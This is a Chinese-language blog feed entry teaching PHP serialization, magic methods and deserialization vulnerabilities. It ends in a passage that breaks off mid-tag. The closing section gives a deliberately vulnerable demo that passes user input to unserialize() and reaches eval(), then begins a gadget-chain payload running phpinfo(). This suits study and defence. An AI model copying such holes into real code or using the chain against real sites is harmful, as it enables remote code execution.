<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mars1y</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-12-18T06:06:34.273Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Mars1y</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP反序列化漏洞学习</title>
    <link href="http://example.com/2023/12/18/PHPunserialize/"/>
    <id>http://example.com/2023/12/18/PHPunserialize/</id>
    <published>2023-12-17T16:00:00.000Z</published>
    <updated>2023-12-18T06:06:34.273Z</updated>
    
    <content type="html"><![CDATA[<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="序列-反序列化函数"><a href="#序列-反序列化函数" class="headerlink" title="序列&#x2F;反序列化函数"></a>序列&#x2F;反序列化函数</h2><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h3><p>​序列化对象或数组，并返回一个字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sites</span> = <span class="keyword">array</span>(<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Facebook&#x27;</span>);</span><br><span class="line"><span class="variable">$serialized_data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$sites</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$serialized_data</span>;</span><br><span class="line"><span class="comment">//a:3:&#123;i:0;s:6:&quot;Google&quot;;i:1;s:6:&quot;Runoob&quot;;i:2;s:8:&quot;Facebook&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>​可进行序列化的对象：</p><table><thead><tr><th><strong>类型</strong></th><th><strong>结构</strong></th></tr></thead><tbody><tr><td>String</td><td>s:长度:”值”;</td></tr><tr><td>Integer</td><td>i:值;</td></tr><tr><td>Boolean</td><td>b:值(1或0);</td></tr><tr><td>Null</td><td>N;</td></tr><tr><td>Array</td><td>a:长度:{……}</td></tr><tr><td>Object</td><td>O:类名长度:”类名”:类中变量个数:{……}</td></tr></tbody></table><p>​Object 类型序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span>=<span class="number">18</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>=<span class="string">&quot;male&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title function_ invoke__">student</span>();</span><br><span class="line"><span class="variable">$serialize</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialize</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:7:&quot;student&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Tom&quot;;s:6:&quot;*age&quot;;i:18;s:12:&quot;studentsex&quot;;s:4:&quot;male&quot;;&#125;</span></span><br><span class="line"><span class="comment">//注意变量对应的访问修饰符，public正常，private是%00类名%00属性名，protected是%00*%00属性名</span></span><br></pre></td></tr></table></figure><h3 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h3><p>​将通过 serialize() 函数序列化后的对象或数组进行反序列化，返回序列化前的内容。如果传递的字符串不可反序列化，则返回 FALSE，并产生一个 E_NOTICE。示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;a:3:&#123;i:0;s:6:&quot;Google&quot;;i:1;s:6:&quot;Runoob&quot;;i:2;s:8:&quot;Facebook&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$unserialized_data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$unserialized_data</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; Google</span></span><br><span class="line"><span class="comment">    [1] =&gt; Runoob</span></span><br><span class="line"><span class="comment">    [2] =&gt; Facebook</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p>​构造方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">whoami</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">whoami</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;age.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$student</span> = <span class="keyword">new</span> <span class="title function_ invoke__">student</span>(<span class="string">&quot;Tom&quot;</span>, <span class="string">&quot;18&quot;</span>, <span class="string">&quot;male&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Tom</span></span><br><span class="line"><span class="comment">18</span></span><br><span class="line"><span class="comment">male</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>​析构方法，在类的实例被删除时自动调用。我们可以在该方法中添加一些释放资源的操作，比如关闭文件、关闭数据库链接。</p><p>​__destruct() 是非必须的，是类的可选组成部分，通常只是用来完成对象被删除时的清理动作而已。而 PHP 的特性 「 运行完一次请求则销毁环境 」 的做法，也没必要使用 __destruct() ，反正执行完后所有该销毁的都会销毁。</p><p>​调用时机：</p><ol><li>unset($obj)</li><li>$obj &#x3D; NULL</li><li>程序自动结束</li></ol><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><p>​当调用 serialize() 序列化一个类的实例时，会首先检查该实例是否存在 __sleep() 方法，如果该方法存在，则自动调用，否则使用默认的序列化方式。该方法必须有返回值，返回一个数组，包含想要序列化的该实例的属性名。</p><p>​我们可以给一个类定义 __sleep() 方法来定制类的实例的序列化结果，剔除不想序列化的变量或添加想要序列化的对象。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;school = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;age&quot;</span>, <span class="string">&quot;school&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$student</span> = <span class="keyword">new</span> <span class="title function_ invoke__">student</span>(<span class="string">&quot;Tom&quot;</span>, <span class="string">&quot;18&quot;</span>, <span class="string">&quot;male&quot;</span>);</span><br><span class="line"><span class="variable">$serialize</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$student</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialize</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:7:&quot;student&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Tom&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;s:6:&quot;school&quot;;s:5:&quot;ABCDE&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><p>​当 unserialize() 反序列化一个类的实例成功后，会检查该实例是否存在 __wakeup() 方法，如果该方法存在，则自动调用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="number">19</span>; <span class="comment">//修改年龄</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;school = <span class="string">&quot;ABCDE&quot;</span>; <span class="comment">//添加学校</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$student</span> = <span class="keyword">new</span> <span class="title function_ invoke__">student</span>(<span class="string">&quot;Tom&quot;</span>, <span class="string">&quot;18&quot;</span>, <span class="string">&quot;male&quot;</span>);</span><br><span class="line"><span class="variable">$serialize</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$student</span>);</span><br><span class="line"><span class="variable">$unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$unserialize</span>-&gt;age.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$unserialize</span>-&gt;school;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">19</span></span><br><span class="line"><span class="comment">ABCDE</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p>​用于一个类的实例被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该输出什么。</p><h3 id="set-和-get"><a href="#set-和-get" class="headerlink" title="__set() 和 __get()"></a>__set() 和 __get()</h3><h3 id="isset-和-unset"><a href="#isset-和-unset" class="headerlink" title="__isset() 和 __unset()"></a>__isset() 和 __unset()</h3><p>​当对 private 变量调用 isset() 或 empty() 时，__isset() 会被调用。</p><p>​当对 private 变量调用 unset() 时，__unset() 会被调用。</p><h3 id="call-和-callStatic"><a href="#call-和-callStatic" class="headerlink" title="__call() 和 __callStatic()"></a>__call() 和 __callStatic()</h3><p>​在非静态上下文中，当调用类的实例中的不可访问（无权限）或不存在的方法的时，将执行 __call() ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">mixed</span> <span class="title function_ invoke__">__call</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$arguments</span> )</span><br></pre></td></tr></table></figure><p>​在静态上下文（如欲调用的方法为静态方法）中，调用类中的不可访问（无权限）或不存在的方法时，将执行 __callStatic() ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="keyword">mixed</span> <span class="title function_ invoke__">__callStatic</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$arguments</span> )</span><br></pre></td></tr></table></figure><ul><li>string $name：要调用的方法名。</li><li>array $arguments：一个枚举数组，包含着要传递给 $name 的参数。</li></ul><p>​示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#无 __call()</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$args</span> <span class="keyword">as</span> <span class="variable">$arg</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Do you like running, &#x27;</span> . <span class="variable">$arg</span> . <span class="string">&#x27;?&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable">$person</span>-&gt;<span class="title function_ invoke__">run</span>(<span class="string">&#x27;David&#x27;</span>);</span><br><span class="line"><span class="comment">//Fatal error: Uncaught Error: Call to protected method Person::run()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#有 __call()</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$args</span> <span class="keyword">as</span> <span class="variable">$arg</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Do you like running, &#x27;</span> . <span class="variable">$arg</span> . <span class="string">&#x27;?&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 如果类中有这个方法，就调用</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$name</span>===<span class="string">&#x27;run&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">run</span>(<span class="variable">$arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Calling unavailable function &#x27;</span> . <span class="variable">$name</span> . <span class="string">&#x27;().&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable">$person</span>-&gt;<span class="title function_ invoke__">run</span>(<span class="string">&#x27;David&#x27;</span>, <span class="string">&#x27;Lily&#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Do you like running, David?</span></span><br><span class="line"><span class="comment">Do you like running, Lily?</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$person</span>-&gt;<span class="title function_ invoke__">jump</span>(<span class="string">&#x27;David&#x27;</span>, <span class="string">&#x27;Lily&#x27;</span>);</span><br><span class="line"><span class="comment">//Calling unavailable function jump().</span></span><br></pre></td></tr></table></figure><h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h3><p>​当我们创建了类的一个实例后，把这个实例当作一个方法来调用时，默认情况下， 它会抛出一个异常：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$student</span> = <span class="keyword">new</span> <span class="title function_ invoke__">student</span>(<span class="string">&quot;Tom&quot;</span>, <span class="number">18</span>, <span class="string">&quot;male&quot;</span>);</span><br><span class="line"><span class="variable">$student</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//Uncaught Error: Function name must be a string</span></span><br></pre></td></tr></table></figure><p>​如果在类中定义了__invoke() 方法，那么它会在实例当作方法来使用时自动调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;调用了__invoke()方法&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$student</span> = <span class="keyword">new</span> <span class="title function_ invoke__">student</span>(<span class="string">&quot;Inf0&quot;</span>, <span class="number">18</span>, <span class="string">&quot;male&quot;</span>);</span><br><span class="line"><span class="variable">$student</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出：调用了__invoke()方法</span></span><br></pre></td></tr></table></figure><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>​PHP 反序列化漏洞的成因在于代码中 unserialize() 接收的参数可控，通过篡改反序列化字符串中类的变量的值实现攻击，其中关键之处在于：</p><ul><li>存在可利用的魔术方法</li><li>存在危险函数</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$demo_test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;demo_test = <span class="keyword">new</span> <span class="title function_ invoke__">func1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;demo_test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;实例已销毁！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func2_test</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;func2_test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​构造 payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$demo_test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;demo_test = <span class="keyword">new</span> <span class="title function_ invoke__">func2</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;demo_test-&gt;func2_test = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;demo_test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;实例已销毁！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span 